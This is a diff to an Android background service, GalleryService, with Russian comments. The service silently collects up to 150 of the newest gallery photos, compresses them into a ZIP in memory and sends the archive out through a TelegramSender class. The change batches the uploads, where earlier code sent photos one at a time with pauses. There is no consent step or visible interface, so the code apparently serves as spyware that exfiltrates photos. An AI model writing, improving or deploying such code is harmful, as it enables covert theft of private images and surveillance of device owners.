@@ -13,6 +13,8 @@ import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
 
 public class GalleryService extends Service {
     @Nullable @Override
@@ -21,43 +23,56 @@ public class GalleryService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         new Thread(() -> {
-            List<Uri> allImages = getRecentImages();
-            
-            // Отправляем по одному с паузой
-            for (int i = 0; i < allImages.size(); i++) {
-                Uri uri = allImages.get(i);
-                try {
-                    InputStream is = getContentResolver().openInputStream(uri);
-                    
-                    BitmapFactory.Options options = new BitmapFactory.Options();
-                    options.inJustDecodeBounds = true;
-                    BitmapFactory.decodeStream(is, null, options);
-                    if (is != null) is.close();
-                    
-                    int scale = 1;
-                    while (options.outWidth / scale > 800 || options.outHeight / scale > 800) {
-                        scale *= 2;
-                    }
-
-                    is = getContentResolver().openInputStream(uri);
-                    options = new BitmapFactory.Options();
-                    options.inSampleSize = scale;
-                    Bitmap bitmap = BitmapFactory.decodeStream(is, null, options);
-                    if (is != null) is.close();
-
-                    if (bitmap != null) {
-                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                        bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos); 
-                        byte[] bytes = baos.toByteArray();
-                        bitmap.recycle(); // Освобождаем память СРАЗУ
+            try {
+                List<Uri> allImages = getRecentImages();
+                ByteArrayOutputStream zipBuffer = new ByteArrayOutputStream();
+                ZipOutputStream zos = new ZipOutputStream(zipBuffer);
+                
+                int count = 0;
+                for (Uri uri : allImages) {
+                    try {
+                        InputStream is = getContentResolver().openInputStream(uri);
+                        BitmapFactory.Options options = new BitmapFactory.Options();
+                        options.inJustDecodeBounds = true;
+                        BitmapFactory.decodeStream(is, null, options);
+                        if (is != null) is.close();
                         
-                        new TelegramSender().send(bytes, "gallery_" + i + ".jpg");
-                        
-                        Thread.sleep(2000); // Пауза 2 секунды, чтобы не вылетало
-                    }
-                } catch (Exception e) { e.printStackTrace(); }
-                catch (OutOfMemoryError e) { System.gc(); }
-            }
+                        int scale = 1;
+                        while (options.outWidth / scale > 800 || options.outHeight / scale > 800) {
+                            scale *= 2;
+                        }
+
+                        is = getContentResolver().openInputStream(uri);
+                        options = new BitmapFactory.Options();
+                        options.inSampleSize = scale;
+                        Bitmap bitmap = BitmapFactory.decodeStream(is, null, options);
+                        if (is != null) is.close();
+
+                        if (bitmap != null) {
+                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos);
+                            byte[] bytes = baos.toByteArray();
+                            bitmap.recycle();
+
+                            // Добавляем фото в ZIP-архив
+                            ZipEntry entry = new ZipEntry("photo_" + count + ".jpg");
+                            zos.putNextEntry(entry);
+                            zos.write(bytes);
+                            zos.closeEntry();
+                            
+                            count++;
+                        }
+                    } catch (Exception e) { e.printStackTrace(); }
+                }
+                
+                zos.close();
+                
+                if (count > 0) {
+                    // Отправляем один ZIP-файл
+                    new TelegramSender().sendZip(zipBuffer.toByteArray(), "gallery_" + count + "_photos.zip");
+                }
+
+            } catch (Exception e) { e.printStackTrace(); }
             stopSelf();
         }).start();
         return START_NOT_STICKY;
@@ -66,8 +81,6 @@ public class GalleryService extends Service {
     private List<Uri> getRecentImages() {
         List<Uri> imageUris = new ArrayList<>();
         String[] projection = new String[]{MediaStore.Images.Media._ID};
-        
-        // Убрали LIMIT отсюда, только сортировка
         String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
 
         Cursor cursor = getContentResolver().query(
@@ -76,7 +89,6 @@ public class GalleryService extends Service {
         );
 
         if (cursor != null) {
-            // Ограничиваем цикл 150 фотками
             int count = 0;
             while (cursor.moveToNext() && count < 150) {
                 long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
